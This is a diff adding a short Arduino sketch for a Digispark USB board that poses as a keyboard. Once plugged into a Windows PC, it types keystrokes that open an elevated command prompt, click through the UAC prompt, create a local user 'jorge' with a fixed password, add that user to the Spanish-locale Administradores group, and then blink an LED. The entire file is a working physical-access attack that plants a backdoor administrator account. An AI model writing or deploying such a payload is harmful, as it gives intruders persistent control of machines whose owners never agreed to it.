@@ -1,0 +1,43 @@
+#include "DigiKeyboard.h"
+
+// the setup routine runs once when you press reset:
+void setup() {
+  pinMode(1, OUTPUT);
+  digitalWrite(1, LOW);
+
+  delay(1000);
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0,MOD_CONTROL_LEFT);
+  delay(10000);
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+  delay(1000);
+  DigiKeyboard.print("cmd");
+  delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+  delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  delay(1000);
+  DigiKeyboard.print("net user jorge jorge12345 ");
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
+  DigiKeyboard.println("add");
+  delay(1000);
+  DigiKeyboard.print("net localgroup Administradores jorge ");
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
+  DigiKeyboard.println("add");
+  delay(1000); 
+  DigiKeyboard.println("exit"); 
+
+  for (int i = 0; i < 3; i++) {
+    digitalWrite(1, HIGH);
+    delay(300);
+    digitalWrite(1, LOW);
+    delay(300);
+  }
+}
+
+// the loop routine runs over and over again forever:
+void loop() {
+
+}
